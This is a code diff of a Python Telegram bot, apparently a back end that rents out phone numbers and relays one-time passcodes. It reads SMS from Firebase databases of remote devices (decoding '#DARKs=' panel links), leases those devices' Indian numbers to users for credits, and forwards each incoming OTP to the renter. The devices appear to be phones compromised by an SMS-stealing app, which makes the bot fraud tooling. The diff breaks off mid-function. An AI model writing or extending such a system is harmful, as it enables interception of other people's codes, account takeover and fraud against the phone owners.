@@ -1,7 +1,8 @@
-import asyncio, os, time, logging, random
+import asyncio, os, time, logging, random, string
+from datetime import datetime
 from aiohttp import web
 from aiogram import Bot, Dispatcher, F, Router
-from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, CopyTextButton
+from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, CopyTextButton, FSInputFile
 from aiogram.filters import Command, CommandStart
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
@@ -15,79 +16,87 @@ logging.basicConfig(level=logging.INFO)
 log = logging.getLogger("OTP-Bot")
 
 BOT_TOKEN = os.getenv("BOT_TOKEN", "")
-OWNER_ID = 8480878371
+MAIN_OWNER = 8480878371
 PORT = int(os.getenv("PORT", 8080))
 
 router = Router()
 running_bots = {}
 active_scans = {}
 
-class AdminStates(StatesGroup):
+# ================= STYLING =================
+SMALL_CAPS_MAP = str.maketrans(
+    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",
+    "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ"
+)
+def sc(text: str) -> str:
+    return text.translate(SMALL_CAPS_MAP)
+
+def btn(text: str, callback_data: str, emoji: str = "") -> InlineKeyboardButton:
+    label = f"{emoji} {sc(text)}".strip()
+    return InlineKeyboardButton(text=label, callback_data=callback_data)
+
+# ================= STATES =================
+class S(StatesGroup):
     add_bulk_urls = State()
+    add_bot = State()
+    add_admin = State()
+    add_super_admin = State()
+    ban_user = State()
     broadcast = State()
+    add_credits_uid = State()
+    add_credits_amt = State()
+    deduct_credits_uid = State()
+    deduct_credits_amt = State()
+    support_msg = State()
+
+# ================= HELPERS =================
+def is_owner(uid):
+    d = db.load_data()
+    return uid == d.get("owner_id") or uid in d.get("super_admins", [])
+
+def is_admin(uid):
+    d = db.load_data()
+    return is_owner(uid) or uid in d.get("admins", [])
+
+def clear_user_lease(uid):
+    d = db.load_data()
+    if str(uid) in d.get("user_leases", {}):
+        del d["user_leases"][str(uid)]
+        db.save_data(d)
 
 def get_servers_grouped(data):
     fbs = data.get("firebases", [])
-    servers = []
-    for i in range(0, len(fbs), 25):
-        servers.append(fbs[i:i+25])
-    return servers
-
-def clear_user_lease(uid):
-    data = db.load_data()
-    if str(uid) in data["user_leases"]:
-        del data["user_leases"][str(uid)]
-        db.save_data(data)
-
-async def get_owner_stats():
-    data = db.load_data()
-    servers = get_servers_grouped(data)
-    stats_list = []
-    total_devices, online_devices = 0, 0
-    
-    for idx, server_fbs in enumerate(servers):
-        s_online, s_total = 0, 0
-        for fb in server_fbs:
-            clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
-            if clients and isinstance(clients, dict):
-                s_total += len(clients)
-                for dev_id, dev_data in clients.items():
-                    if isinstance(dev_data, dict) and dev_data.get("status") is True:
-                        s_online += 1
-        stats_list.append({"name": f"Server {idx+1}", "fbs": server_fbs, "online": s_online, "total": s_total})
-        total_devices += s_total
-        online_devices += s_online
-    return total_devices, online_devices, stats_list
+    return [fbs[i:i+25] for i in range(0, len(fbs), 25)]
 
 async def send_otp_to_user(uid, service, otp, msg_text, rent_id):
     otp_msg = (
-        f"🔔 <b>OTP Received!</b>\n\n"
-        f"📱 <b>Service:</b> {service}\n"
-        f"🔑 <b>OTP:</b> {otp}\n\n"
-        f"🆔 Rent ID: <code>{rent_id}</code>\n"
-        f"💬 <b>Msg:</b> {msg_text[:100]}..."
+        f"🔔 <b>{sc('otp received')}!</b>\n\n"
+        f"📱 <b>{sc('service')}:</b> {service}\n"
+        f"🔑 <b>{sc('otp')}:</b> <code>{otp}</code>\n\n"
+        f"🆔 <b>{sc('rent id')}:</b> <code>{rent_id}</code>\n"
+        f"💬 <i>{msg_text[:60]}...</i>"
     )
     kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=f"{otp}", copy_text=CopyTextButton(text=otp))]])
     
-    data = db.load_data()
-    user = data["users"].get(str(uid))
+    d = db.load_data()
+    user = d["users"].get(str(uid))
     if user:
         hist = user.setdefault("otp_history", [])
-        hist.insert(0, {"service": service, "otp": otp, "msg": msg_text[:50], "time": int(time.time())})
+        hist.insert(0, {"service": service, "otp": otp, "time": int(time.time())})
         user["otp_history"] = hist[:20]
-        db.save_data(data)
+        db.save_data(d)
         
     try:
         bot = running_bots.get(BOT_TOKEN)
         if bot: await bot.send_message(uid, otp_msg, reply_markup=kb, parse_mode="HTML")
     except Exception: pass
 
-async def get_latest_messages_for_fb(fb_url, auth):
+async def get_latest_msgs(fb_url, auth, limit=5):
     all_msgs = {}
     clients = await fbu.fetch_fb(f"{fb_url}/clients.json", auth)
     if not clients: return all_msgs
     for dev_id in clients.keys():
-        msgs = await fbu.fetch_fb(f"{fb_url}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=5", auth)
+        msgs = await fbu.fetch_fb(f"{fb_url}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast={limit}", auth)
         if msgs:
             for k, v in msgs.items():
                 if isinstance(v, dict) and v.get("type") == "incoming":
@@ -96,12 +105,14 @@ async def get_latest_messages_for_fb(fb_url, auth):
     return all_msgs
 
 async def background_scanner():
-    log.info("Global Scanner Started...")
+    log.info("Scanner Started...")
+    dead_url_tracker = {}
+    
     while True:
         try:
-            data = db.load_data()
-            fbs = data.get("firebases", [])
-            leases = data.get("user_leases", {})
+            d = db.load_data()
+            fbs = d.get("firebases", [])
+            leases = d.get("user_leases", {})
             
             device_to_users = {}
             current_time = time.time()
@@ -109,9 +120,35 @@ async def background_scanner():
                 if current_time < lease["expire_at"] and "dev_id" in lease:
                     device_to_users.setdefault(lease["dev_id"], []).append(uid)
             
+            # Dead URL Auto-Removal
+            active_fbs = []
+            for fb in fbs:
+                latest = await get_latest_msgs(fb["url"], fb.get("auth"), limit=1)
+                has_recent = False
+                for dev, msg in latest.items():
+                    if fbu.calculate_health([msg]) >= 2:
+                        has_recent = True
+                        break
+                if has_recent:
+                    active_fbs.append(fb)
+                    dead_url_tracker[fb["url"]] = 0
+                else:
+                    dead_url_tracker[fb["url"]] = dead_url_tracker.get(fb["url"], 0) + 1
+                    if dead_url_tracker[fb["url"]] < 10: # 10 scans (30s) se dead hai toh remove
+                        active_fbs.append(fb)
+                    else:
+                        log.info(f"Auto-removed dead URL: {fb['url']}")
+            
+            if len(active_fbs) != len(fbs):
+                d["firebases"] = active_fbs
+                # Auto-arrange labels
+                for i, f in enumerate(d["firebases"]):
+                    f["label"] = f"Base {i+1}"
+                db.save_data(d)
+
             if device_to_users:
-                for fb in fbs:
-                    latest_msgs = await get_latest_messages_for_fb(fb["url"], fb.get("auth"))
+                for fb in active_fbs:
+                    latest_msgs = await get_latest_msgs(fb["url"], fb.get("auth"), limit=5)
                     for dev_id, msg in latest_msgs.items():
                         key = (fb["url"], dev_id)
                         msg_id = int(msg.get("id", 0))
@@ -130,241 +167,167 @@ async def background_scanner():
             log.error(f"Scanner Error: {e}")
             await asyncio.sleep(5)
 
+# ================= KEYBOARDS =================
 def main_kb():
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="📱 Get Number", callback_data="user:get_num")],
-        [InlineKeyboardButton(text="📜 OTP History", callback_data="user:history")]
+        [btn("get number", "user:get_num", "📱"), btn("my numbers", "user:saved", "⭐")],
+        [btn("otp history", "user:history", "📜"), btn("help/support", "user:support", "🆘")]
     ])
 
 def admin_kb():
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="👤 Enter as User", callback_data="user:home")],
-        [InlineKeyboardButton(text="📊 Analytics", callback_data="admin:analytics")],
-        [InlineKeyboardButton(text="🔥 Manage Servers", callback_data="admin:manage_fb")],
-        [InlineKeyboardButton(text="🤖 Manage Bots", callback_data="admin:bots")],
-        [InlineKeyboardButton(text="📢 Broadcast", callback_data="admin:broadcast")],
-        [InlineKeyboardButton(text="🔄 Refresh Panel", callback_data="admin:home")]
+        [btn("enter as user", "user:home", "👤"), btn("analytics", "admin:analytics", "📊")],
+        [btn("manage servers", "admin:manage_fb", "🔥"), btn("manage bots", "admin:bots", "🤖")],
+        [btn("manage admins", "admin:admins", "🛡"), btn("broadcast", "admin:broadcast", "📢")],
+        [btn("add credits", "admin:credits:add", "💰"), btn("deduct credits", "admin:credits:deduct", "💸")],
+        [btn("view users", "admin:users", "👥"), btn("ban user", "admin:ban", "🚫")],
+        [btn("settings", "admin:settings", "⚙️"), btn("refresh panel", "admin:home", "🔄")]
     ])
 
+# ================= HANDLERS =================
 @router.message(CommandStart())
 async def cmd_start(msg: Message):
-    data = db.load_data()
     uid = msg.from_user.id
+    d = db.load_data()
     clear_user_lease(uid)
     
-    is_new = False
-    if str(uid) not in data["users"]:
-        data["users"][str(uid)] = {"name": msg.from_user.full_name, "joined": int(time.time()), "otp_history": []}
-        db.save_data(data)
-        is_new = True
+    if str(uid) not in d["users"]:
+        d["users"][str(uid)] = {"name": msg.from_user.full_name, "joined": int(time.time()), "credits": 0, "otp_history": [], "saved_numbers": {}}
+        db.save_data(d)
+        try: await msg.bot.send_message(MAIN_OWNER, f"🆕 <b>{sc('new user')}</b>\n👤 {msg.from_user.full_name}\n🆔 <code>{uid}</code>", parse_mode="HTML")
+        except: pass
     
-    if uid == data["owner_id"] or uid in data.get("admins", []):
-        try: await msg.answer("⏳ <i>Loading analytics...</i>", parse_mode="HTML")
-        except TelegramBadRequest: pass
+    if is_admin(uid):
         await admin_home_msg(msg)
     else:
-        if not data.get("free_mode", True): return await msg.answer("⛔ Access Denied.")
-        await msg.answer(f"👋 <b>Welcome {msg.from_user.first_name}!</b>\nSelect an option:", reply_markup=main_kb(), parse_mode="HTML")
+        if uid in d.get("banned", []): return await msg.answer("🚫 You are banned.")
+        await msg.answer(f"👋 <b>{sc('welcome to otp hub')}</b>\n{sc('select an option below')}:", reply_markup=main_kb(), parse_mode="HTML")
 
 async def admin_home_msg(msg: Message):
-    total, online, stats_list = await get_owner_stats()
+    d = db.load_data()
+    fbs = d.get("firebases", [])
+    servers = get_servers_grouped(d)
+    
     text = (
-        f"👑 <b>Owner Analytics Dashboard</b>\n\n"
-        f"🔥 <b>Total Servers:</b> {len(stats_list)}\n"
-        f"📱 <b>Total Lines:</b> {total}\n"
-        f"🟢 <b>Online Lines:</b> {online}\n"
-        f"👥 <b>Total Users:</b> {len(db.load_data().get('users', {}))}\n\n"
-        f"<b>Servers List:</b>\n"
+        f"👑 <b>{sc('owner dashboard')}</b>\n\n"
+        f"🔥 {sc('total servers')}: <b>{len(servers)}</b>\n"
+        f"📱 {sc('total bases')}: <b>{len(fbs)}</b>\n"
+        f"👥 {sc('total users')}: <b>{len(d.get('users', {}))}</b>\n\n"
+        f"<b>{sc('server list')}:</b>\n"
     )
-    for stat in stats_list:
-        text += f"📁 <b>{stat['name']}</b> (Max 25 Bases)\n└ {stat['online']} ON / {stat['total']} Total\n\n"
+    for i, srv in enumerate(servers):
+        text += f"📁 Server {i+1} | <b>{len(srv)} Bases</b>\n"
+        
     try: await msg.answer(text, reply_markup=admin_kb(), parse_mode="HTML")
-    except TelegramBadRequest: pass
+    except: pass
 
 @router.callback_query(F.data == "admin:home")
 async def admin_home_cb(cq: CallbackQuery):
-    try: await cq.message.edit_text("🔄 Refreshing live analytics...")
-    except TelegramBadRequest: pass
+    try: await cq.message.edit_text("🔄 Refreshing...")
+    except: pass
     await admin_home_msg(cq.message)
 
-@router.callback_query(F.data == "admin:analytics")
-async def admin_analytics(cq: CallbackQuery):
-    data = db.load_data()
-    leases = data.get("user_leases", {})
-    text = "📊 <b>Active Rent IDs & Numbers</b>\n\n"
-    if not leases:
-        text += "No active leases right now."
-    for uid, lease in leases.items():
-        if time.time() < lease["expire_at"]:
-            nums = ", ".join([f"+91{n}" for n in lease.get("numbers", [])]) or "No Number"
-            text += f"👤 User: <code>{uid}</code>\n🆔 Rent ID: <code>{lease['dev_id']}</code>\n📞 Number: {nums}\n🌍 Server: {lease.get('country', 'Unknown')}\n\n"
-    
-    kb = [[InlineKeyboardButton(text="🔙 Back", callback_data="admin:home")]]
-    try: await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
-    except TelegramBadRequest: pass
-
+# ================= ADMIN SERVER MANAGEMENT =================
 @router.callback_query(F.data == "admin:manage_fb")
 async def admin_manage_fb(cq: CallbackQuery):
-    data = db.load_data()
-    servers = get_servers_grouped(data)
-    if not servers: 
-        kb = [[InlineKeyboardButton(text="📁 Bulk Add", callback_data="admin:add_bulk")], [InlineKeyboardButton(text="🔙 Back", callback_data="admin:home")]]
-        return await cq.message.edit_text("No servers added yet.", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))
-    
+    d = db.load_data()
+    servers = get_servers_grouped(d)
     kb = []
-    for idx, s_fbs in enumerate(servers):
-        kb.append([InlineKeyboardButton(text=f"📁 Server {idx+1} ({len(s_fbs)} Bases)", callback_data=f"admin:viewfb:{idx}")])
+    for i, srv in enumerate(servers):
+        kb.append([btn(f"server {i+1} ({len(srv)} bases)", f"admin:viewfb:{i}", "📁")])
+    kb.append([btn("add bulk urls", "admin:add_bulk", "➕")])
+    kb.append([btn("back", "admin:home", "🔙")])
     
-    kb.append([InlineKeyboardButton(text="📁 Bulk Add", callback_data="admin:add_bulk")])
-    kb.append([InlineKeyboardButton(text="🔙 Back", callback_data="admin:home")])
-    
-    try: await cq.message.edit_text("Manage Servers:", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))
-    except TelegramBadRequest: pass
-
-@router.callback_query(F.data == "admin:add_bulk")
-async def admin_add_bulk_start(cq: CallbackQuery, state: FSMContext):
-    await state.set_state(AdminStates.add_bulk_urls)
-    await cq.message.edit_text("Send URLs or Panel Links (one per line). Auto 25-25 karke Server ban jayega.", parse_mode="HTML")
-
-@router.message(AdminStates.add_bulk_urls)
-async def admin_add_bulk_done(msg: Message, state: FSMContext):
-    await state.clear()
-    data = db.load_data()
-    added = 0
-    
-    for line in msg.text.strip().split("\n"):
-        url = line.strip()
-        if not url: continue
-        
-        if "#DARKs=" in url or "?s=" in url:
-            decoded = fbu.decode_panel_url(url)
-            if decoded: url = decoded[0]
-            
-        if url.startswith("http"):
-            data["firebases"].append({"url": url, "label": "Base", "auth": ""})
-            added += 1
-            
-    db.save_data(data)
-    await msg.answer(f"✅ Added {added} bases successfully! Auto-Servers created.", reply_markup=admin_kb())
+    try: await cq.message.edit_text(f"🔥 <b>{sc('manage servers')}</b>\n\n{sc('select server or add urls')}:", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
+    except: pass
 
 @router.callback_query(F.data.startswith("admin:viewfb:"))
 async def admin_viewfb(cq: CallbackQuery):
     idx = int(cq.data.split(":")[2])
-    data = db.load_data()
-    servers = get_servers_grouped(data)
-    if idx >= len(servers): return await cq.answer("Server not found!")
+    d = db.load_data()
+    servers = get_servers_grouped(d)
+    srv = servers[idx]
     
-    server_fbs = servers[idx]
+    try: await cq.message.edit_text("🔄 Fetching...")
+    except: pass
     
-    try: await cq.message.edit_text("🔄 Fetching live bases...")
-    except TelegramBadRequest: pass
-    
-    text = f"📁 <b>Server {idx+1} - Bases List</b>\n\n"
-    for i, fb in enumerate(server_fbs):
+    text = f"📁 <b>Server {idx+1} Bases</b>\n\n"
+    kb = []
+    for i, fb in enumerate(srv):
         clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
-        is_online = bool(clients and any(isinstance(d, dict) and d.get("status") for d in clients.values()))
-        status = "🟢 Online" if is_online else "🔴 Dead/Offline"
-        text += f"Base {i+1}: {status}\n🔗 <code>{fb['url']}</code>\n\n"
+        online = sum(1 for c in clients.values() if isinstance(c, dict) and c.get("status")) if clients else 0
+        text += f"Base {i+1}: 🟢 {online} Online\n🔗 <code>{fb['url']}</code>\n\n"
+        kb.append([btn(f"remove base {i+1}", f"admin:rmfb:{idx}:{i}", "🗑")])
         
-    kb = [[InlineKeyboardButton(text="🔙 Back", callback_data="admin:manage_fb")]]
+    kb.append([btn("back", "admin:manage_fb", "🔙")])
     try: await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
-    except TelegramBadRequest: pass
+    except: pass
 
-@router.callback_query(F.data == "admin:bots")
-async def admin_bots(cq: CallbackQuery):
-    data = db.load_data()
-    tokens = data.get("extra_tokens", [])
-    text = f"🤖 <b>Manage Bots</b>\n\nMain Bot: Active\nExtra Bots: {len(tokens)}\n\nUse <code>/add_bot &lt;token&gt;</code> to add a new bot."
-    kb = [[InlineKeyboardButton(text="🔙 Back", callback_data="admin:home")]]
-    try: await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
-    except TelegramBadRequest: pass
-
-@router.message(Command("add_bot"))
-async def cmd_add_bot(msg: Message):
-    if msg.from_user.id != OWNER_ID: return
-    parts = msg.text.split()
-    if len(parts) != 2: return await msg.answer("Usage: <code>/add_bot &lt;token&gt;</code>", parse_mode="HTML")
-    new_token = parts[1]
+@router.callback_query(F.data.startswith("admin:rmfb:"))
+async def admin_rmfb(cq: CallbackQuery):
+    parts = cq.data.split(":")
+    srv_idx, base_idx = int(parts[2]), int(parts[3])
+    d = db.load_data()
     
-    data = db.load_data()
-    if new_token not in data.setdefault("extra_tokens", []):
-        data["extra_tokens"].append(new_token)
-        db.save_data(data)
+    servers = get_servers_grouped(d)
+    if srv_idx < len(servers) and base_idx < len(servers[srv_idx]):
+        fb_to_remove = servers[srv_idx][base_idx]
+        d["firebases"] = [f for f in d["firebases"] if f["url"] != fb_to_remove["url"]]
         
-    if new_token not in running_bots:
-        await start_bot_instance(new_token)
-        await msg.answer("✅ Bot added and started in background!")
-    else:
-        await msg.answer("⚠️ Bot is already running.")
+        # Auto-arrange
+        for i, f in enumerate(d["firebases"]):
+            f["label"] = f"Base {i+1}"
+        db.save_data(d)
+        await cq.answer("✅ Base removed & auto-arranged!")
+    await admin_manage_fb(cq)
 
-async def start_bot_instance(token: str):
-    bot = Bot(token=token)
-    dp = Dispatcher(storage=MemoryStorage())
-    dp.include_router(router)
-    running_bots[token] = bot
-    asyncio.create_task(dp.start_polling(bot))
+@router.callback_query(F.data == "admin:add_bulk")
+async def admin_add_bulk(cq: CallbackQuery, state: FSMContext):
+    await state.set_state(S.add_bulk_urls)
+    await cq.message.edit_text(f"📁 <b>{sc('bulk add urls')}</b>\n\n{sc('send urls one per line')}:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("cancel", "admin:manage_fb", "❌")]]))
 
-@router.callback_query(F.data == "admin:broadcast")
-async def admin_broadcast(cq: CallbackQuery, state: FSMContext):
-    await state.set_state(AdminStates.broadcast)
-    await cq.message.edit_text("Send the message to broadcast to all users:")
-
-@router.message(AdminStates.broadcast)
-async def admin_broadcast_done(msg: Message, state: FSMContext):
+@router.message(S.add_bulk_urls)
+async def admin_add_bulk_done(msg: Message, state: FSMContext):
     await state.clear()
-    data = db.load_data()
-    users = list(data.get("users", {}).keys())
-    success = 0
-    for uid in users:
-        try:
-            bot = running_bots.get(BOT_TOKEN)
-            if bot:
-                await bot.copy_message(chat_id=int(uid), from_chat_id=msg.chat.id, message_id=msg.message_id)
-                success += 1
-                await asyncio.sleep(0.05)
-        except Exception: pass
-    await msg.answer(f"✅ Broadcast sent to {success} users!", reply_markup=admin_kb())
+    d = db.load_data()
+    added = 0
+    for line in msg.text.strip().split("\n"):
+        url = line.strip()
+        if not url: continue
+        if "#DARKs=" in url or "?s=" in url:
+            dec = fbu.decode_panel_url(url)
+            if dec: url = dec[0]
+        if url.startswith("http"):
+            d["firebases"].append({"url": url, "label": "Base", "auth": ""})
+            added += 1
+    # Auto-arrange
+    for i, f in enumerate(d["firebases"]):
+        f["label"] = f"Base {i+1}"
+    db.save_data(d)
+    await msg.answer(f"✅ {added} Bases added & auto-arranged!", reply_markup=admin_kb())
 
 # ================= USER FLOW =================
-
 @router.callback_query(F.data == "user:home")
 async def user_home(cq: CallbackQuery):
-    try: await cq.message.edit_text("👋 <b>Welcome!</b>\nSelect an option:", reply_markup=main_kb(), parse_mode="HTML")
-    except TelegramBadRequest: pass
-
-@router.callback_query(F.data == "user:history")
-async def user_history(cq: CallbackQuery):
-    uid = cq.from_user.id
-    data = db.load_data()
-    hist = data["users"].get(str(uid), {}).get("otp_history", [])
-    if not hist:
-        kb = [[InlineKeyboardButton(text="🏠 Main Menu", callback_data="user:home")]]
-        return await cq.message.edit_text("📜 <b>OTP History</b>\n\nNo history found.", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
-        
-    text = "📜 <b>Your OTP History</b>\n\n"
-    for h in hist:
-        dt = time.strftime('%H:%M', time.localtime(h['time']))
-        text += f"🕒 {dt} | {h['service']}\n🔑 <code>{h['otp']}</code>\n\n"
-        
-    kb = [[InlineKeyboardButton(text="🏠 Main Menu", callback_data="user:home")]]
-    try: await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
-    except TelegramBadRequest: pass
+    clear_user_lease(cq.from_user.id)
+    try: await cq.message.edit_text(f"👋 <b>{sc('main menu')}</b>", reply_markup=main_kb(), parse_mode="HTML")
+    except: pass
 
 @router.callback_query(F.data == "user:get_num")
 async def user_get_num(cq: CallbackQuery):
     clear_user_lease(cq.from_user.id)
-    data = db.load_data()
-    servers = get_servers_grouped(data)
-    if not servers: return await cq.message.edit_text("❌ No servers available.")
+    d = db.load_data()
+    servers = get_servers_grouped(d)
+    if not servers: return await cq.answer("No servers available.")
     
     kb = []
-    for idx, _ in enumerate(servers):
-        ping = await fbu.check_ping(servers[idx][0]["url"])
-        kb.append([InlineKeyboardButton(text=f"🌍 Server {idx+1} ({ping})", callback_data=f"server_sel:{idx}")])
-        
-    kb.append([InlineKeyboardButton(text="🏠 Main Menu", callback_data="user:home")])
-    try: await cq.message.edit_text("🌍 <b>Select a Server:</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
-    except TelegramBadRequest: pass
+    for i, _ in enumerate(servers):
+        ping = await fbu.check_ping(servers[i][0]["url"])
+        kb.append([btn(f"server {i+1} ({ping})", f"server_sel:{i}", "🌍")])
+    kb.append([btn("main menu", "user:home", "🏠")])
+    
+    try: await cq.message.edit_text(f"🌍 <b>{sc('select server')}:</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
+    except: pass
 
 @router.callback_query(F.data.startswith("server_sel:"))
 async def user_server_selected(cq: CallbackQuery):
@@ -372,120 +335,238 @@ async def user_server_selected(cq: CallbackQuery):
     uid = cq.from_user.id
     clear_user_lease(uid)
     
-    data = db.load_data()
-    servers = get_servers_grouped(data)
+    d = db.load_data()
+    servers = get_servers_grouped(d)
     if idx >= len(servers): return await cq.answer("Server not found!")
     
-    server_fbs = servers[idx]
+    try: await cq.message.edit_text(f"🔄 {sc('fetching fresh number')}...")
+    except: pass
     
-    try: await cq.message.edit_text("🔄 Fetching fresh number...")
-    except TelegramBadRequest: pass
-    
-    used = data.setdefault("used_devices", {}).setdefault(str(uid), {})
+    used = d.setdefault("used_devices", {}).setdefault(str(uid), {})
     now = int(time.time())
     
-    available_devices = []
-    repeat_devices = []
-    all_devices = []
+    available, repeat, all_devs = [], [], []
     
-    for fb in server_fbs:
+    for fb_i, fb in enumerate(servers[idx]):
         clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
         if not clients: continue
-        for dev_id, d in clients.items():
-            if isinstance(d, dict) and d.get("status") is True:
-                all_devices.append((fb, dev_id, d))
+        for dev_id, c in clients.items():
+            if isinstance(c, dict) and c.get("status") is True:
+                all_devs.append((fb_i, fb, dev_id, c))
                 last_used = used.get(dev_id, 0)
-                diff = now - last_used
-                
-                if diff > 86400: # > 24 hours (Normal)
-                    available_devices.append((fb, dev_id, d))
-                elif diff > 43200: # 12 to 24 hours (Repeat #)
-                    repeat_devices.append((fb, dev_id, d))
+                if now - last_used > 86400: available.append((fb_i, fb, dev_id, c))
+                elif now - last_used > 43200: repeat.append((fb_i, fb, dev_id, c))
     
-    is_repeat = False
-    if available_devices:
-        selected_fb, dev_id, dev_data = random.choice(available_devices)
-    elif repeat_devices:
-        selected_fb, dev_id, dev_data = random.choice(repeat_devices)
-        is_repeat = True
-    elif all_devices:
-        selected_fb, dev_id, dev_data = random.choice(all_devices)
-        is_repeat = True
-    else:
-        kb = [[InlineKeyboardButton(text="🔄 Try Another Server", callback_data="user:get_num")], [InlineKeyboardButton(text="🏠 Main Menu", callback_data="user:home")]]
-        return await cq.message.edit_text("❌ <b>No online lines in this Server.</b>\nTry another Server.", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
+    is_rep = False
+    if available: fb_i, fb, dev_id, dev_data = random.choice(available)
+    elif repeat: fb_i, fb, dev_id, dev_data = random.choice(repeat); is_rep = True
+    elif all_devs: fb_i, fb, dev_id, dev_data = random.choice(all_devs); is_rep = True
+    else: return await cq.answer("❌ No online lines in this server.", show_alert=True)
         
     used[dev_id] = now
+    data = db.load_data()
     data["used_devices"][str(uid)] = used
     
-    msgs_dict = await fbu.fetch_fb(f"{selected_fb['url']}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=50", selected_fb.get("auth"))
+    msgs_dict = await fbu.fetch_fb(f"{fb['url']}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=50", fb.get("auth"))
     msgs = [v for k, v in msgs_dict.items() if isinstance(v, dict) and v.get("type") == "incoming"] if msgs_dict else []
     
     if msgs:
-        latest_id = max(int(m.get("id", 0)) for m in msgs)
-        active_scans[(selected_fb['url'], dev_id)] = latest_id
+        active_scans[(fb['url'], dev_id)] = max(int(m.get("id", 0)) for m in msgs)
     
     best_nums = fbu.extract_best_numbers(dev_data, msgs)
     health = fbu.calculate_health(msgs)
     
+    base_label = fb.get("label", f"Base {fb_i+1}")
+    
     data["user_leases"][str(uid)] = {
-        "dev_id": dev_id, "fb_url": selected_fb["url"], "country": f"Server {idx+1}", "numbers": [n for n, c in best_nums],
-        "expire_at": int(time.time()) + 3600
+        "dev_id": dev_id, "fb_url": fb["url"], "base_idx": base_label, "numbers": [n for n, c in best_nums],
+        "expire_at": int(time.time()) + 3600, "health": health
     }
     db.save_data(data)
     
-    repeat_mark = " #" if is_repeat else ""
-    
+    rep_mark = " #" if is_rep else ""
     nums_text = ""
     kb_nums = []
+    
     if best_nums:
         for n, c in best_nums:
-            nums_text += f"📞 <code>+91{n}</code>\n"
-            kb_nums.append([InlineKeyboardButton(text=f"Copy +91{n}", copy_text=CopyTextButton(text=f"+91{n}"))])
+            nums_text += f"📞 <code>+91{n}</code> | {base_label}\n"
+            kb_nums.append([InlineKeyboardButton(text=f"📋 Copy +91{n}", copy_text=CopyTextButton(text=f"+91{n}"))])
     else:
-        nums_text = "⚠️ <b>SIM active hai, OTP aane par number update ho jayega.</b>"
+        nums_text = f"⚠️ <b>{sc('sim active. otp aate hi number update hoga')}.</b>"
         
     battery = str(dev_data.get("battery", "100")).replace("%", "")
     if not battery or battery == "?": battery = "100"
     
     text = (
-        f"📱 <b>Number Details</b>\n"
-        f"🔥 Server: {idx+1}\n"
-        f"🆔 Rent ID: <code>{dev_id}</code>{repeat_mark}\n"
-        f"⚙️ Code: <code>{battery}T</code>\n"
-        f"❤️ Health: <b>{health}/10</b>\n\n"
+        f"📱 <b>{sc('number details')}</b>\n"
+        f"🔥 {sc('server')}: {idx+1} | {base_label}\n"
+        f"🆔 {sc('rent id')}: <code>{dev_id}</code>{rep_mark}\n"
+        f"⚙️ {sc('code')}: <code>{battery}T</code>\n"
+        f"❤️ {sc('health')}: <b>{health}/10</b>\n\n"
         f"{nums_text}\n"
-        f"⌛ <i>Waiting for OTP (1 Hour)...</i>"
+        f"⌛ <i>{sc('waiting for otp (1 hour)')}...</i>"
     )
     
     kb = kb_nums + [
-        [InlineKeyboardButton(text="Copy Rent ID", copy_text=CopyTextButton(text=dev_id))],
-        [InlineKeyboardButton(text="🔄 Next Number", callback_data=f"server_sel:{idx}"), InlineKeyboardButton(text="⏹ Stop", callback_data="stop_listen")],
-        [InlineKeyboardButton(text="🔙 Back", callback_data="user:get_num")]
+        [InlineKeyboardButton(text="📋 Copy Rent ID", copy_text=CopyTextButton(text=dev_id))],
+        [btn("info", f"info:{dev_id}", "ℹ️"), btn("save number", f"save:{dev_id}", "⭐")],
+        [btn("next number", f"server_sel:{idx}", "🔄"), btn("stop", "stop_listen", "⏹")],
+        [btn("back", "user:get_num", "🔙")]
     ]
+    
     try: await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
-    except TelegramBadRequest: pass
+    except: pass
+
+@router.callback_query(F.data.startswith("info:"))
+async def show_info(cq: CallbackQuery):
+    dev_id = cq.data.split(":")[1]
+    d = db.load_data()
+    lease = d.get("user_leases", {}).get(str(cq.from_user.id), {})
+    if not lease or lease.get("dev_id") != dev_id:
+        return await cq.answer("Lease expired!", show_alert=True)
+        
+    info_text = (
+        f"ℹ️ <b>{sc('device information')}</b>\n\n"
+        f"🆔 <b>{sc('rent id')}:</b> <code>{dev_id}</code>\n"
+        f"📁 <b>{sc('base')}:</b> {lease.get('base_idx', 'Unknown')}\n"
+        f"❤️ <b>{sc('health')}:</b> {lease.get('health')}/10\n"
